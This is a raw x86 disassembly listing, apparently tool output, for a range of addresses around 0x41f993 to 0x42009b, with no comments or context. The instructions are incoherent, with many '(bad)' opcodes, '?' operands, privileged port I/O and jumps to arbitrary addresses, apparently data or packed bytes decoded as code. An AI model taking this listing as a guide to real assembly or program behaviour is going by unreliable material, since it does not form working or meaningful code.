  41f993:	arpl   WORD PTR [edx+0x39d05bc7],si
  41f999:	pop    ebp
  41f99a:	bswap  edi
  41f99c:	jne    0x41f9dd
  41f99e:	fdiv   QWORD PTR ds:0xcad9e71
  41f9a4:	push   ss
  41f9a5:	push   ecx
  41f9a6:	sub    DWORD PTR [ecx+edi*8-0x7b],edi
  41f9aa:	push   0xffffffb6
  41f9ac:	mov    eax,0xaf46b436
  41f9b1:	enter  0x5478,0x65
  41f9b5:	mov    dl,0xde
  41f9b7:	dec    ebp
  41f9b8:	jge    0x41fa17
  41f9ba:	add    eax,0xf05cd23c
  41f9bf:	ret    
  41f9c0:	arpl   bp,bx
  41f9c2:	stc    
  41f9c3:	mov    ?,WORD PTR [edx+0x2575a2c0]
  41f9c9:	pop    es
  41f9ca:	out    dx,eax
  41f9cb:	cwde   
  41f9cc:	and    DWORD PTR [ebp-0x2a923683],0xffffffaf
  41f9d3:	outs   dx,DWORD PTR es:[esi]
  41f9d5:	aad    0x2
  41f9d7:	lods   al,BYTE PTR ds:[esi]
  41f9d8:	pop    esi
  41f9d9:	repz fsin 
  41f9dc:	ins    DWORD PTR es:[edi],dx
  41f9dd:	fs add al,0xda
  41f9e0:	dec    edx
  41f9e1:	clc    
  41f9e2:	out    dx,eax
  41f9e3:	scas   al,BYTE PTR es:[edi]
  41f9e4:	mov    eax,ds:0x5df7c46c
  41f9e9:	sbb    al,0xa6
  41f9eb:	pop    esi
  41f9ec:	jge    0x41f9e2
  41f9ee:	cli    
  41f9ef:	(bad)  
  41f9f0:	clc    
  41f9f1:	sahf   
  41f9f2:	aaa    
  41f9f3:	ret    0xb5b5
  41f9f6:	adc    al,0xc
  41f9f8:	je     0x41fa37
  41f9fa:	xor    ch,BYTE PTR [edi-0x57]
  41f9fd:	xchg   ecx,eax
  41f9fe:	or     DWORD PTR [edx-0x23],esi
  41fa01:	and    BYTE PTR [edx-0x6a085737],dl
  41fa07:	sbb    al,0xf7
  41fa09:	add    edi,DWORD PTR [edi]
  41fa0b:	ja     0x41fa50
  41fa0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa0e:	xor    al,0x2b
  41fa10:	sbb    al,BYTE PTR [ebx+edx*4+0x4c32e38d]
  41fa17:	cmp    eax,0x4e1d6c3d
  41fa1c:	mov    DWORD PTR [edi+0x64],0xc3bd3eac
  41fa23:	test   DWORD PTR [ecx-0x78],ebx
  41fa26:	pop    edi
  41fa27:	mov    eax,0xe6cc5120
  41fa2c:	call   0xfe76c68f
  41fa31:	(bad)  
  41fa33:	inc    ebx
  41fa34:	push   0x31
  41fa36:	jnp    0x41fa0e
  41fa38:	mov    DWORD PTR [ecx-0xc40440d],edx
  41fa3e:	jnp    0x41fa99
  41fa40:	addr16 mov ecx,0x8036fc66
  41fa46:	mov    BYTE PTR [ebp+edx*1-0x31e0a09d],dh
  41fa4d:	cmp    al,0x32
  41fa4f:	icebp  
  41fa50:	mov    ah,0xe2
  41fa52:	cmc    
  41fa53:	in     al,0xbd
  41fa55:	or     esi,esp
  41fa57:	push   ss
  41fa58:	test   BYTE PTR [edi+0x2c],bh
  41fa5b:	loop   0x41faae
  41fa5d:	jnp    0x41fad7
  41fa5f:	pop    ss
  41fa60:	cwde   
  41fa61:	or     DWORD PTR [edi],edi
  41fa63:	xchg   ebx,eax
  41fa64:	mov    al,0x5
  41fa66:	inc    ebx
  41fa67:	imul   ebp,DWORD PTR [edx+0x4],0x25
  41fa6b:	add    bh,bl
  41fa6d:	mov    eax,0xcfb7e16
  41fa72:	js     0x41fa78
  41fa74:	push   ss
  41fa75:	push   esp
  41fa76:	adc    bl,BYTE PTR [edi]
  41fa78:	ja     0x41fa90
  41fa7a:	lds    esi,FWORD PTR [edi+0x50e28721]
  41fa80:	mov    ch,0x33
  41fa82:	xchg   esi,eax
  41fa83:	(bad)  
  41fa84:	leave  
  41fa85:	clc    
  41fa86:	icebp  
  41fa87:	cmc    
  41fa88:	int3   
  41fa89:	(bad)  
  41fa8a:	xor    bh,BYTE PTR [edi+0x2c]
  41fa8d:	test   eax,0x7ca8ce83
  41fa92:	xchg   ebx,eax
  41fa93:	fwait
  41fa94:	dec    eax
  41fa95:	sti    
  41fa96:	pop    edi
  41fa97:	pop    ebx
  41fa98:	loope  0x41fa21
  41fa9a:	cmc    
  41fa9b:	push   eax
  41fa9c:	sbb    DWORD PTR [eax+edx*4-0x7c],edi
  41faa0:	cwde   
  41faa1:	leave  
  41faa2:	outs   dx,BYTE PTR ds:[esi]
  41faa3:	scas   al,BYTE PTR es:[edi]
  41faa4:	rol    dh,0x50
  41faa7:	mov    al,0x98
  41faa9:	shl    bh,cl
  41faab:	cmp    ebp,edi
  41faad:	sub    ebp,eax
  41faaf:	dec    ebp
  41fab0:	stc    
  41fab1:	popa   
  41fab2:	mov    al,ds:0xb154e116
  41fab7:	pop    esp
  41fab8:	cmp    dl,BYTE PTR [ebx-0x44d43931]
  41fabe:	mov    DWORD PTR [esp+edx*8+0x7c],ecx
  41fac2:	add    al,0x3d
  41fac4:	fisubr WORD PTR [edx]
  41fac6:	jg     0x41fa7e
  41fac8:	cdq    
  41fac9:	arpl   cx,sp
  41facb:	pop    ss
  41facc:	call   0x32890c80
  41fad1:	add    al,0x9a
  41fad3:	clc    
  41fad4:	ror    ebx,1
  41fad6:	jnp    0x41fb12
  41fad8:	push   ebx
  41fad9:	mov    eax,ds:0x870bdef4
  41fade:	dec    edi
  41fadf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fae0:	or     eax,0x78dac0e6
  41fae5:	test   eax,0xb7211cf
  41faea:	aas    
  41faeb:	inc    ebx
  41faec:	(bad)  
  41faed:	std    
  41faee:	mov    bh,0x88
  41faf0:	ds in  eax,dx
  41faf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faf3:	sbb    eax,0x94846c40
  41faf8:	ss nop
  41fafa:	or     eax,0x79d813f0
  41faff:	clc    
  41fb00:	inc    edi
  41fb01:	adc    BYTE PTR [ebx+0x1f6e806f],0x47
  41fb08:	push   cs
  41fb09:	in     eax,dx
  41fb0a:	mov    dl,BYTE PTR [ebx-0x1fb3d1e0]
  41fb10:	add    esp,DWORD PTR [edi-0x46]
  41fb13:	out    0x69,eax
  41fb15:	jp     0x41fb38
  41fb17:	cdq    
  41fb18:	jl     0x41fb42
  41fb1a:	out    dx,eax
  41fb1b:	fwait
  41fb1c:	icebp  
  41fb1d:	data16 adc bl,BYTE PTR [edi-0xa73d578]
  41fb24:	add    dh,0x5a
  41fb27:	mov    edi,esp
  41fb29:	sub    ebx,DWORD PTR [ecx]
  41fb2b:	jecxz  0x41fb27
  41fb2d:	jbe    0x41fb11
  41fb2f:	dec    esp
  41fb30:	clc    
  41fb31:	cmp    eax,DWORD PTR [eax-0x11]
  41fb34:	adc    edx,DWORD PTR [esp+ecx*4-0x39]
  41fb38:	loope  0x41fb92
  41fb3a:	inc    ebp
  41fb3b:	loop   0x41fb4f
  41fb3d:	inc    esi
  41fb3e:	leave  
  41fb3f:	and    al,0x56
  41fb41:	and    al,0xe
  41fb43:	call   0x923f:0x49a45fa5
  41fb4a:	retf   
  41fb4b:	mov    ch,0x3
  41fb4d:	mov    edx,0xdb55ae3a
  41fb53:	push   0x8ed38fbd
  41fb58:	inc    edi
  41fb59:	les    edi,FWORD PTR [edi+0x55]
  41fb5c:	xor    BYTE PTR [eax+0x2],bl
  41fb5f:	sbb    eax,0xd8d8e14
  41fb64:	push   esi
  41fb65:	add    BYTE PTR [edi+0x6d5ce9a9],bl
  41fb6b:	shl    DWORD PTR [edx-0x80],0x20
  41fb6f:	jno    0x41faf6
  41fb71:	sub    cl,BYTE PTR [edi+0x28358db2]
  41fb77:	jo     0x41fb2b
  41fb79:	push   es
  41fb7a:	icebp  
  41fb7b:	sti    
  41fb7c:	and    DWORD PTR [ecx+edx*4-0x39],ebp
  41fb80:	jnp    0x41fb1c
  41fb82:	leave  
  41fb83:	ret    0x3376
  41fb86:	cli    
  41fb87:	lods   al,BYTE PTR ds:[esi]
  41fb88:	cwde   
  41fb89:	cmp    BYTE PTR [ebp+0x69],dl
  41fb8c:	stc    
  41fb8d:	dec    esp
  41fb8e:	add    BYTE PTR [esi+esi*2+0x6a],dh
  41fb92:	scas   al,BYTE PTR es:[edi]
  41fb93:	push   ebx
  41fb94:	std    
  41fb95:	mov    ds:0x17ab610a,al
  41fb9a:	xchg   ebp,eax
  41fb9b:	scas   al,BYTE PTR es:[edi]
  41fb9c:	fwait
  41fb9d:	mov    ecx,0xabf182f5
  41fba2:	je     0x41fb5a
  41fba4:	jecxz  0x41fbf7
  41fba6:	sbb    BYTE PTR ds:0x5f3f0728,ch
  41fbac:	into   
  41fbad:	xor    al,0xe9
  41fbaf:	outs   dx,BYTE PTR ds:[esi]
  41fbb0:	popa   
  41fbb1:	sub    BYTE PTR ds:0xc36ee2ab,bl
  41fbb7:	mov    BYTE PTR [ecx+eax*4],dl
  41fbba:	adc    ch,ah
  41fbbc:	push   es
  41fbbd:	xchg   esp,eax
  41fbbe:	jo     0x41fbf1
  41fbc0:	or     eax,0x4e2d4fe7
  41fbc5:	pusha  
  41fbc6:	lock daa 
  41fbc8:	jb     0x41fbce
  41fbca:	out    0x5b,al
  41fbcc:	adc    BYTE PTR [eax-0x40],cl
  41fbcf:	adc    BYTE PTR [ecx],cl
  41fbd1:	rol    DWORD PTR [ecx-0x799b5103],0xfd
  41fbd8:	xchg   esi,eax
  41fbd9:	stc    
  41fbda:	xchg   ecx,eax
  41fbdb:	and    ebx,DWORD PTR [ebx+esi*4+0x7d9adeea]
  41fbe2:	push   cs
  41fbe3:	add    eax,0xa39e9a15
  41fbe8:	inc    ecx
  41fbe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbea:	cli    
  41fbeb:	xor    al,0x96
  41fbed:	push   ebx
  41fbee:	jg     0x41fbdd
  41fbf0:	sub    eax,0x6e982183
  41fbf5:	mov    al,ds:0x428498c1
  41fbfa:	mov    ah,0x85
  41fbfc:	dec    ebp
  41fbfd:	xlat   BYTE PTR ds:[ebx]
  41fbfe:	jle    0x41fbc9
  41fc00:	push   eax
  41fc01:	xchg   ecx,eax
  41fc02:	test   edi,0x3b0f558e
  41fc08:	mov    ebx,0xd2c3b7da
  41fc0e:	hlt    
  41fc0f:	sar    BYTE PTR [edx],0x74
  41fc12:	push   ebp
  41fc13:	jge    0x41fc42
  41fc15:	adc    ch,bh
  41fc17:	xchg   ecx,eax
  41fc18:	add    BYTE PTR [edx+0x1],bl
  41fc1b:	ret    0x2427
  41fc1e:	lds    edx,FWORD PTR [eax]
  41fc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc21:	jae    0x41fc24
  41fc23:	lea    esp,[ebx+0x21c85923]
  41fc29:	dec    edi
  41fc2a:	dec    esp
  41fc2b:	hlt    
  41fc2c:	test   DWORD PTR [esi+0x3],ebp
  41fc2f:	fcom   QWORD PTR [edi-0x37]
  41fc32:	jnp    0x41fc0a
  41fc34:	aad    0x11
  41fc36:	sti    
  41fc37:	or     ah,BYTE PTR [esi+eiz*2]
  41fc3a:	xchg   edx,eax
  41fc3b:	frstor [esi+eax*8+0x66]
  41fc3f:	add    edi,DWORD PTR [edi+0x48eb9795]
  41fc45:	xchg   edx,eax
  41fc46:	mov    ebp,0x49731e59
  41fc4b:	jb     0x41fcad
  41fc4d:	inc    eax
  41fc4e:	sbb    ecx,0x35
  41fc51:	cld    
  41fc52:	daa    
  41fc53:	aam    0xb4
  41fc55:	dec    BYTE PTR [ebx]
  41fc57:	test   al,0xbd
  41fc59:	(bad)  
  41fc5a:	pop    esp
  41fc5b:	dec    edi
  41fc5c:	cwde   
  41fc5d:	sbb    al,0x4
  41fc5f:	mov    cl,0x8b
  41fc61:	ret    
  41fc62:	ret    0x6501
  41fc65:	test   al,0x17
  41fc67:	sbb    al,0xd4
  41fc69:	js     0x41fcca
  41fc6b:	cli    
  41fc6c:	retf   0xc7d7
  41fc6f:	(bad)
  41fc72:	bound  esi,QWORD PTR [edi+0x78]
  41fc75:	jecxz  0x41fc68
  41fc77:	xchg   ebp,eax
  41fc78:	xchg   ecx,eax
  41fc79:	push   ebx
  41fc7a:	push   0xffffffc8
  41fc7c:	lods   eax,DWORD PTR ds:[esi]
  41fc7d:	sub    BYTE PTR [edi],0x12
  41fc80:	mov    ds:0xf2f19a09,al
  41fc85:	fdiv   DWORD PTR [edx]
  41fc87:	fbstp  TBYTE PTR [eax+0x2bdd1d8]
  41fc8d:	mov    edi,0x30788ce9
  41fc92:	xlat   BYTE PTR ds:[ebx]
  41fc93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc94:	loopne 0x41fc93
  41fc96:	es cdq 
  41fc98:	xor    eax,0x7d42b2e6
  41fc9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc9e:	clc    
  41fc9f:	dec    eax
  41fca0:	sub    bh,BYTE PTR [eax]
  41fca2:	arpl   bx,si
  41fca4:	xchg   edi,eax
  41fca5:	jno    0x41fcc8
  41fca7:	loop   0x41fce5
  41fca9:	pop    edx
  41fcaa:	retf   0xb677
  41fcad:	dec    esi
  41fcae:	ss aam 0xd1
  41fcb1:	cmp    edx,ecx
  41fcb3:	in     al,dx
  41fcb4:	inc    eax
  41fcb5:	mov    dl,0xeb
  41fcb7:	fstp   DWORD PTR [ecx-0x58]
  41fcba:	out    dx,eax
  41fcbb:	add    ebp,edx
  41fcbd:	jns    0x41fcb9
  41fcbf:	mov    ah,0x21
  41fcc1:	push   ecx
  41fcc2:	(bad)  
  41fcc3:	adc    eax,DWORD PTR [eax+0x5b]
  41fcc6:	retf   0x92
  41fcc9:	jmp    0x287aacc6
  41fcce:	sahf   
  41fccf:	push   ecx
  41fcd0:	loop   0x41fc91
  41fcd2:	xchg   DWORD PTR [eax+ecx*2-0x1d],ebp
  41fcd6:	scas   eax,DWORD PTR es:[edi]
  41fcd7:	mov    cl,0xb5
  41fcd9:	ds xor eax,0xe8408e8c
  41fcdf:	lea    esp,[eax+0x19]
  41fce2:	push   cs
  41fce3:	fcom   QWORD PTR [ebx]
  41fce5:	daa    
  41fce6:	xor    al,0x54
  41fce8:	test   DWORD PTR [edx],esp
  41fcea:	or     BYTE PTR [ebx-0x3b],dl
  41fced:	xchg   ecx,eax
  41fcee:	out    dx,al
  41fcef:	xchg   edi,eax
  41fcf0:	jmp    0x41fd10
  41fcf2:	or     esi,edi
  41fcf4:	stos   DWORD PTR es:[edi],eax
  41fcf5:	pop    esi
  41fcf6:	les    ebx,FWORD PTR [edi-0x2ccc5286]
  41fcfc:	jae    0x41fd1c
  41fcfe:	or     al,0xd4
  41fd00:	sub    DWORD PTR [edx],ebx
  41fd02:	cmp    edi,DWORD PTR [esi]
  41fd04:	out    dx,eax
  41fd05:	aam    0xc9
  41fd07:	adc    DWORD PTR [esi+0x2b],eax
  41fd0a:	sub    eax,0x7ae81be6
  41fd0f:	push   edi
  41fd10:	stos   DWORD PTR es:[edi],eax
  41fd11:	mov    eax,DWORD PTR [eax]
  41fd13:	mov    ah,0xac
  41fd15:	push   es
  41fd16:	or     eax,0x986c62e0
  41fd1b:	fs call 0xc22d:0xbf4363ee
  41fd23:	dec    ebp
  41fd24:	push   ebp
  41fd25:	fsubr  QWORD PTR [ebp+0x4b584a34]
  41fd2b:	mov    BYTE PTR [eax-0x23cb5674],ch
  41fd31:	test   eax,esi
  41fd33:	in     al,0x7f
  41fd35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd36:	pop    fs
  41fd38:	js     0x41fd7c
  41fd3a:	pop    edx
  41fd3b:	mov    esi,0x40a71afa
  41fd40:	pop    eax
  41fd41:	test   DWORD PTR [edi],eax
  41fd43:	jnp    0x41fccb
  41fd45:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd47:	fnstenv [ecx+eax*8]
  41fd4a:	test   eax,0xda6cc656
  41fd4f:	add    DWORD PTR [edx],ecx
  41fd51:	adc    al,0xbe
  41fd53:	imul   BYTE PTR [ebp+0x7d994d19]
  41fd59:	scas   al,BYTE PTR es:[edi]
  41fd5a:	add    al,0xe1
  41fd5c:	pop    ebx
  41fd5d:	lods   eax,DWORD PTR ds:[esi]
  41fd5e:	loop   0x41fd0b
  41fd60:	imul   eax,DWORD PTR [ebx-0x278d614f],0xac91c076
  41fd6a:	repnz and eax,0xe902e0a0
  41fd70:	inc    esi
  41fd71:	sub    dl,BYTE PTR [ebp+0x1413188f]
  41fd77:	mov    ecx,0xadcf477f
  41fd7c:	jae    0x41fdf2
  41fd7e:	ins    DWORD PTR es:[edi],dx
  41fd7f:	sbb    BYTE PTR [ebx],dl
  41fd81:	ja     0x41fdeb
  41fd83:	mov    ebp,0x3ea11dd1
  41fd88:	sbb    eax,0x2d51b0e6
  41fd8d:	add    DWORD PTR [ebp-0x4138d57],edx
  41fd93:	lea    ecx,[eax]
  41fd95:	and    DWORD PTR [edx+0x4e30cc2c],ebx
  41fd9b:	fldcw  WORD PTR [eax+0x4a]
  41fd9e:	mov    ecx,0xdd05cb16
  41fda3:	xor    DWORD PTR [ebx],esp
  41fda5:	scas   al,BYTE PTR es:[edi]
  41fda6:	lods   al,BYTE PTR ds:[esi]
  41fda7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fda8:	imul   ebp,DWORD PTR [ecx+0x20],0xfc36ee15
  41fdaf:	and    eax,DWORD PTR [eax+eiz*8-0x38]
  41fdb3:	inc    ebp
  41fdb4:	push   esi
  41fdb5:	xchg   ch,cl
  41fdb7:	and    ch,BYTE PTR [edi]
  41fdb9:	mov    dl,0xe5
  41fdbb:	lods   al,BYTE PTR ds:[esi]
  41fdbc:	sti    
  41fdbd:	xchg   BYTE PTR [edx],bh
  41fdbf:	adc    esi,DWORD PTR [ecx]
  41fdc1:	arpl   WORD PTR [ecx],bx
  41fdc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdc5:	dec    edx
  41fdc6:	lods   al,BYTE PTR ds:[esi]
  41fdc7:	leave  
  41fdc8:	stos   BYTE PTR es:[edi],al
  41fdc9:	or     DWORD PTR [ecx+0x5c],0xdaabde2b
  41fdd0:	in     eax,dx
  41fdd1:	and    BYTE PTR [ebp-0x5b],ah
  41fdd4:	loopne 0x41fe25
  41fdd6:	sub    ebp,DWORD PTR [ebp-0x77fc7c89]
  41fddc:	test   eax,0x5292bfbd
  41fde1:	xchg   edi,eax
  41fde2:	jecxz  0x41fd7e
  41fde4:	je     0x41fd82
  41fde6:	push   es
  41fde7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fde8:	jb     0x41fdea
  41fdea:	test   BYTE PTR [ecx-0x6c],dh
  41fded:	push   0x89f5e91
  41fdf2:	xor    ecx,DWORD PTR [esi-0x3ce0b431]
  41fdf8:	scas   al,BYTE PTR es:[edi]
  41fdf9:	push   0xffffffaa
  41fdfb:	popa   
  41fdfc:	lock leave 
  41fdfe:	idiv   BYTE PTR [ebx]
  41fe00:	sbb    al,0x68
  41fe02:	add    bx,WORD PTR [eax+0x71]
  41fe06:	or     BYTE PTR ds:0x58138561,dl
  41fe0c:	dec    edi
  41fe0d:	xor    cl,BYTE PTR [esi]
  41fe0f:	mov    eax,ds:0x540cca18
  41fe14:	stos   BYTE PTR es:[edi],al
  41fe15:	sahf   
  41fe16:	adc    bh,BYTE PTR ds:0x1d718283
  41fe1c:	mov    eax,ds:0x3c107923
  41fe21:	lods   eax,DWORD PTR ds:[esi]
  41fe22:	dec    edi
  41fe23:	push   ds
  41fe24:	or     al,0x68
  41fe26:	mov    al,ds:0x946302fd
  41fe2b:	jg     0x41fe2e
  41fe2d:	pop    ss
  41fe2e:	inc    edi
  41fe2f:	inc    esi
  41fe30:	mov    ah,0xfe
  41fe32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe33:	out    0xec,al
  41fe35:	fwait
  41fe36:	pop    esp
  41fe37:	mov    ch,0x47
  41fe39:	loope  0x41fe2a
  41fe3b:	into   
  41fe3c:	xchg   DWORD PTR [ebx+edx*2+0x10],ebx
  41fe40:	mov    ecx,0x8d2adf2c
  41fe45:	xchg   ebx,eax
  41fe46:	and    BYTE PTR [ecx],ch
  41fe48:	jno    0x41fec9
  41fe4a:	nop
  41fe4b:	xchg   esi,eax
  41fe4c:	mov    al,BYTE PTR [edx]
  41fe4e:	repnz repz inc ebp
  41fe51:	rol    BYTE PTR [esi+esi*1],0xdb
  41fe55:	and    DWORD PTR [ebx-0x257fb61f],0xffffffee
  41fe5c:	fadd   DWORD PTR [esi-0x2a562e2b]
  41fe62:	push   cs
  41fe63:	fisttp DWORD PTR ss:[esi+0x68]
  41fe67:	mov    ?,WORD PTR [edi]
  41fe69:	in     eax,0x61
  41fe6b:	out    0x16,al
  41fe6d:	neg    bl
  41fe6f:	pop    ss
  41fe70:	mov    gs,WORD PTR [eax]
  41fe72:	adc    eax,0x33c5b86
  41fe77:	not    BYTE PTR [ebx-0x20]
  41fe7a:	mov    esi,0xb007d592
  41fe7f:	dec    ebx
  41fe80:	idiv   dh
  41fe82:	xchg   DWORD PTR [ebx],esi
  41fe84:	bound  edx,QWORD PTR [edi]
  41fe86:	lahf   
  41fe87:	or     DWORD PTR [ebx-0x37f5b261],eax
  41fe8d:	in     al,0xc3
  41fe8f:	loope  0x41fe5c
  41fe91:	(bad)  
  41fe92:	out    0xae,eax
  41fe94:	mov    bh,0xce
  41fe96:	sub    DWORD PTR gs:[esi-0x5f67c3e],esp
  41fe9d:	stc    
  41fe9e:	not    esp
  41fea0:	loop   0x41ff20
  41fea2:	stc    
  41fea3:	pop    esp
  41fea4:	xchg   esp,eax
  41fea5:	pop    ebp
  41fea6:	sbb    eax,0xca7dfe99
  41feab:	rcr    al,1
  41fead:	outs   dx,BYTE PTR ds:[esi]
  41feae:	ror    esi,cl
  41feb0:	push   ds
  41feb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feb2:	inc    eax
  41feb3:	lods   al,BYTE PTR ds:[esi]
  41feb4:	mov    ebp,0xeb40ef60
  41feb9:	jns    0x41fe3e
  41febb:	cmp    BYTE PTR [eax],cl
  41febd:	xchg   ebp,eax
  41febe:	push   cs
  41febf:	shr    DWORD PTR [ebp+eiz*2-0x51d09c48],1
  41fec6:	outs   dx,DWORD PTR ds:[esi]
  41fec7:	and    BYTE PTR ds:0x2952e4a9,ch
  41fecd:	in     eax,0x8d
  41fecf:	mov    ?,ebx
  41fed1:	jmp    0xf64b860
  41fed6:	mov    eax,0x7a400583
  41fedb:	mov    ?,WORD PTR [edx]
  41fedd:	adc    BYTE PTR [edx],0x53
  41fee0:	cwde   
  41fee1:	pusha  
  41fee2:	(bad)  
  41fee3:	scas   al,BYTE PTR es:[edi]
  41fee4:	push   esi
  41fee5:	mov    ds:0x7ec9cee8,eax
  41feea:	jmp    DWORD PTR [ecx]
  41feec:	push   ecx
  41feed:	jae    0x41ff55
  41feef:	jl     0x41ff5c
  41fef1:	mov    al,ds:0x564d687a
  41fef6:	inc    edi
  41fef7:	jg     0x41fe9f
  41fef9:	sub    DWORD PTR [eax-0x36],ebp
  41fefc:	mov    eax,0x4af20557
  41ff01:	mov    ds:0x9e9c4686,al
  41ff06:	ret    
  41ff07:	lods   al,BYTE PTR ds:[esi]
  41ff08:	push   ecx
  41ff09:	ins    DWORD PTR es:[edi],dx
  41ff0a:	sbb    ch,BYTE PTR [eax+0x48]
  41ff0d:	imul   edx,DWORD PTR [eax],0x3e
  41ff10:	mov    dh,0x5a
  41ff12:	repz pop ss
  41ff14:	cmp    BYTE PTR [esp+eiz*2+0x68],cl
  41ff18:	pop    esi
  41ff19:	mov    cs,esi
  41ff1b:	mov    cl,0x6
  41ff1d:	mov    ds:0x3b7a51d4,eax
  41ff22:	int3   
  41ff23:	sub    ah,bl
  41ff25:	bound  edx,QWORD PTR [ebx]
  41ff27:	jmp    0x70507fa7
  41ff2c:	fs loop 0x41ffaa
  41ff2f:	adc    al,0x15
  41ff31:	out    0xe5,al
  41ff33:	mov    esp,edx
  41ff35:	lods   eax,DWORD PTR ds:[esi]
  41ff36:	jmp    FWORD PTR [ebx]
  41ff38:	jmp    0x41fefc
  41ff3a:	mov    ebx,0x7c0ffa06
  41ff3f:	adc    eax,0x64adcf2d
  41ff44:	gs ins DWORD PTR es:[edi],dx
  41ff46:	pop    ss
  41ff47:	aam    0x4
  41ff49:	or     al,0x19
  41ff4b:	push   ebp
  41ff4c:	leave  
  41ff4d:	pop    eax
  41ff4e:	mov    dh,0x62
  41ff50:	add    ebp,DWORD PTR [esi]
  41ff52:	adc    DWORD PTR [ebp+0x6],ebx
  41ff55:	dec    ebp
  41ff56:	jl     0x41ffb0
  41ff58:	ror    BYTE PTR [edx-0x5739c5cf],0x44
  41ff5f:	mov    edi,0xf3ca84c6
  41ff64:	int3   
  41ff65:	mov    al,ds:0x903bac4b
  41ff6a:	mov    ebx,DWORD PTR [edx+edi*2-0x5e]
  41ff6e:	mov    ds:0x164ad18,eax
  41ff73:	cmp    BYTE PTR [esi-0x2e],bh
  41ff76:	sbb    cl,BYTE PTR [esi-0x46a9faa0]
  41ff7c:	mov    ds:0x7d7ae04c,eax
  41ff81:	sub    eax,0x89347f88
  41ff86:	add    dh,dl
  41ff88:	mov    dh,0x64
  41ff8a:	pop    esp
  41ff8b:	dec    ebp
  41ff8c:	cwde   
  41ff8d:	(bad)  
  41ff8e:	cdq    
  41ff8f:	mov    bl,0xc2
  41ff91:	rol    DWORD PTR [edi-0x48cf18f7],0x74
  41ff98:	inc    edi
  41ff99:	mov    dl,0x64
  41ff9b:	fsub   DWORD PTR [eax-0x1233ca5e]
  41ffa1:	add    eax,ebx
  41ffa3:	mov    esi,0x651b937b
  41ffa8:	fs mov ebp,0xc92c5e27
  41ffae:	jle    0x420024
  41ffb0:	xor    ecx,esp
  41ffb2:	js     0x41ff3c
  41ffb4:	repz daa 
  41ffb6:	add    edi,DWORD PTR [edx+0x25]
  41ffb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffba:	leave  
  41ffbb:	jmp    0x41ff96
  41ffbd:	push   ebx
  41ffbe:	pop    ss
  41ffbf:	dec    ebp
  41ffc0:	jb     0x41ff4a
  41ffc2:	jge    0x41ff78
  41ffc4:	cmc    
  41ffc5:	mov    edx,0x287e7b26
  41ffca:	icebp  
  41ffcb:	ja     0x420033
  41ffcd:	clc    
  41ffce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffcf:	adc    eax,0xfe76ca7
  41ffd4:	jae    0x42003a
  41ffd6:	rcl    DWORD PTR [esi],cl
  41ffd8:	hlt    
  41ffd9:	rol    BYTE PTR [edx+0x72],0xfa
  41ffdd:	xchg   ebx,eax
  41ffde:	imul   ebx,DWORD PTR [eax+eax*2+0x23],0x41
  41ffe3:	enter  0x554,0xb3
  41ffe7:	ret    0xe5f9
  41ffea:	cwde   
  41ffeb:	push   ds
  41ffec:	inc    esp
  41ffed:	pop    ecx
  41ffee:	out    0x9a,eax
  41fff0:	sahf   
  41fff1:	or     DWORD PTR [edi-0x799f813f],edi
  41fff7:	in     al,0xb8
  41fff9:	dec    edi
  41fffa:	dec    ebp
  41fffb:	jle    0x41ff94
  41fffd:	mov    ebx,esi
  41ffff:	lods   eax,DWORD PTR ds:[esi]
  420000:	pop    esi
  420001:	mul    edi
  420003:	push   es
  420004:	ror    BYTE PTR [ecx],0x37
  420007:	lds    edi,FWORD PTR fs:[edx]
  42000a:	cwde   
  42000b:	out    0xee,eax
  42000d:	pop    ecx
  42000e:	mov    al,0x34
  420010:	adc    BYTE PTR [ebx],dl
  420012:	enter  0xfef2,0x7d
  420016:	outs   dx,DWORD PTR ds:[esi]
  420017:	mov    esi,0xffb93cb2
  42001c:	adc    DWORD PTR [esi+0x15],eax
  42001f:	hlt    
  420020:	jns    0x420008
  420022:	dec    esp
  420023:	retf   0x2a76
  420026:	jmp    0xa2181669
  42002b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42002c:	imul   DWORD PTR ds:0x8b4dd5c9
  420032:	mov    fs:0x9a1e0b0a,al
  420038:	mov    al,cs:0xf869a4a0
  42003e:	push   esi
  42003f:	stos   DWORD PTR es:[edi],eax
  420040:	or     BYTE PTR [edi+0x15e25b09],ah
  420046:	retf   
  420047:	cld    
  420048:	lods   al,BYTE PTR ds:[esi]
  420049:	push   edi
  42004a:	inc    edx
  42004b:	adc    al,0xaa
  42004d:	or     eax,0x914f3c16
  420052:	pop    esp
  420053:	jmp    0xaf55:0xefc84e0c
  42005a:	adc    al,0x22
  42005c:	sbb    eax,0x7da6d1b6
  420061:	loop   0x4200b6
  420063:	xlat   BYTE PTR ds:[ebx]
  420064:	cld    
  420065:	jge    0x420092
  420067:	shr    al,cl
  420069:	mov    ah,0x39
  42006b:	clc    
  42006c:	sub    DWORD PTR [edi+ebx*1],ebx
  42006f:	les    ebp,FWORD PTR ds:0x78004b1a
  420075:	imul   eax,DWORD PTR [eax],0xffffff95
  420078:	ss (bad) 
  42007a:	std    
  42007b:	retf   0xc5f9
  42007e:	pusha  
  42007f:	sar    DWORD PTR ds:0xfc0d54d4,1
  420085:	mov    ebx,0x6975bf32
  42008a:	dec    ecx
  42008b:	mov    dx,0x6843
  42008f:	in     al,dx
  420090:	fbld   TBYTE PTR [edi+0x6a]
  420093:	dec    esi
  420094:	push   cx
  420096:	mov    bl,0x29
  420098:	jl     0x420054
  42009a:	aaa    
  42009b:	in     eax,0xa2
